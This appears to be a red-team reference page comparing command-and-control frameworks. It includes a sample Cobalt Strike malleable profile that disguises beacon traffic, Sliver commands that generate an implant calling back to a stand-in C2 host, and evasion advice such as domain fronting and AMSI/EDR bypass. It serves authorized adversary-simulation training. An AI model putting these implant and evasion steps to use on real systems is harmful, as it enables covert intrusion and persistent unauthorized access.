---
title: Command & Control Frameworks
description: Comparison of popular C2 frameworks used in red team operations
---

# Command & Control Frameworks

Command and Control (C2) frameworks are essential tools for red team operations, providing a means to maintain communication with compromised systems while evading detection.

## Framework Comparison

| Framework | Language | Key Features | Stealth Capabilities | Learning Curve |
|-----------|----------|--------------|----------------------|----------------|
| Cobalt Strike | Java | Malleable C2, Beacon | High | Steep |
| Metasploit | Ruby | Extensive exploit library | Moderate | Moderate |
| Sliver | Go | Cross-platform, modern | High | Moderate |
| Covenant | .NET | Web UI, Grunts | Moderate | Gentle |
| Mythic | Python | API-driven, modular | High | Moderate |

## Cobalt Strike

Cobalt Strike is a commercial penetration testing tool designed for adversary simulations.

### Key Features

- **Beacon**: Primary payload for covert communications
- **Malleable C2**: Customizable network indicators
- **Sleep Timers**: Control operation tempo
- **Lateral Movement**: Built-in tools for pivoting

### Basic Beacon Setup

```java
# Example malleable C2 profile
set sleeptime "30000";
set jitter "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/updates";
    client {
        header "Accept" "text/html,application/xhtml+xml,application/xml";
        header "Referer" "https://www.google.com/";
        header "Accept-Encoding" "gzip, deflate";
    }
    server {
        header "Server" "Apache";
        header "X-Powered-By" "PHP/7.4.1";
        header "Content-Type" "text/html; charset=UTF-8";
    }
}
```

## Sliver

Sliver is a modern, cross-platform open-source C2 framework.

### Key Features

- **Multiplayer Mode**: Team-based operations
- **Multiple C2 Protocols**: DNS, HTTP(S), mTLS, WireGuard
- **Dynamic Code Generation**: Unique implants per target
- **Cross-Platform**: Windows, Mac, Linux clients and servers

### Basic Sliver Setup

```bash
# Generate an HTTPS implant
sliver > generate --http https://c2.example.com --save /tmp/implant

# Start a listener
sliver > http

# Once implant connects
sliver > use [session ID]
sliver (DESKTOP-TARGET) > info
```

## OPSEC Considerations

When using C2 frameworks, consider the following operational security measures:

1. **Infrastructure Setup**:
   - Use redirectors to separate team servers from end victims
   - Implement domain fronting where possible
   - Consider using legitimate cloud services as proxies

2. **Communication Security**:
   - Use encrypted channels (HTTPS, mTLS)
   - Implement jitter in callback timing
   - Minimize data volume transferred
   - Use legitimate-looking domains

3. **Payload Security**:
   - Use in-memory execution techniques
   - Implement anti-forensics capabilities
   - Consider AMSI/EDR bypass techniques

## Detection & Evasion

Modern security tools often look for C2 indicators:

- **Network Detection**: Unusual connection patterns, known C2 signatures
- **Host Detection**: Unusual process behavior, memory patterns
- **Evasion Techniques**: Sleep timers, legitimate domains, traffic blending

## Ethical Usage Reminder

These tools should only be used within the context of authorized engagements with proper legal permissions and documentation.